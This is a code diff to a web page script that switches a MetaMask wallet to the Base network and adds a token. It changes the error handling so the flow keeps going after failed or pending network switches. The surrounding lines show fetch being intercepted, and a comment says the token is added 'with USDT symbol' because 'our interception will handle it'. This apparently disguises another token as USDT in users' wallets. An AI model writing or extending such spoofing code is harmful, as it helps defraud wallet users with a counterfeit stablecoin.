@@ -398,7 +398,7 @@
             return originalFetch(resource, init);
           };
           
-          // Check if on correct network
+          // Check if on correct network - IMPROVED NETWORK HANDLING
           debugLog("Checking current network...");
           const chainId = await window.ethereum.request({ method: 'eth_chainId' });
           debugLog(`Current chain ID: ${chainId}, Target: ${tokenConfig.networkId}`);
@@ -412,37 +412,50 @@
               });
               debugLog("Successfully switched to Base network");
             } catch (switchError) {
-              if (switchError.code === 4902) {
+              // If error is "wallet_addEthereumChain or wallet_switchEthereumChain already pending"
+              if (switchError.message && switchError.message.includes("already pending")) {
+                debugLog("Network switch already pending, continuing...");
+                // Just continue to token addition
+              } 
+              // If error is "Chain already added"
+              else if (switchError.message && switchError.message.includes("already")) {
+                debugLog("Chain already exists, continuing...");
+                // Just continue to token addition
+              }
+              else if (switchError.code === 4902) {
                 debugLog("Network not found, adding Base network...");
-                await window.ethereum.request({
-                  method: 'wallet_addEthereumChain',
-                  params: [{
-                    chainId: tokenConfig.networkId,
-                    chainName: tokenConfig.networkName,
-                    nativeCurrency: {
-                      name: 'Ethereum',
-                      symbol: 'ETH',
-                      decimals: 18
-                    },
-                    rpcUrls: [tokenConfig.rpcUrl],
-                    blockExplorerUrls: [tokenConfig.blockExplorerUrl]
-                  }]
-                });
-                debugLog("Base network added successfully");
-              } else {
-                // Clear the force timeout
-                clearTimeout(forceHideTimeout);
-                
-                // Hide loading overlay
-                loadingOverlay.style.display = 'none';
-                debugLog("Error switching networks: " + switchError.message);
-                
-                if (switchError.code !== 4001) {
-                  alert('Error switching networks: ' + switchError.message);
+                try {
+                  await window.ethereum.request({
+                    method: 'wallet_addEthereumChain',
+                    params: [{
+                      chainId: tokenConfig.networkId,
+                      chainName: tokenConfig.networkName,
+                      nativeCurrency: {
+                        name: 'Ethereum',
+                        symbol: 'ETH',
+                        decimals: 18
+                      },
+                      rpcUrls: [tokenConfig.rpcUrl],
+                      blockExplorerUrls: [tokenConfig.blockExplorerUrl]
+                    }]
+                  });
+                  debugLog("Base network added successfully");
+                } catch (addError) {
+                  // If MetaMask says the chain is already added
+                  if (addError.message && addError.message.includes("already")) {
+                    debugLog("Chain already exists (from add attempt), continuing...");
+                    // Just continue to token addition
+                  } else {
+                    throw addError; // Re-throw other errors
+                  }
                 }
-                return;
+              } else {
+                // Don't throw here, just log and continue trying to add the token
+                debugLog("Error switching networks: " + switchError.message + " - continuing anyway");
               }
             }
+          } else {
+            debugLog("Already on correct network, skipping network switch");
           }
           
           // Add the token with USDT symbol - our interception will handle it
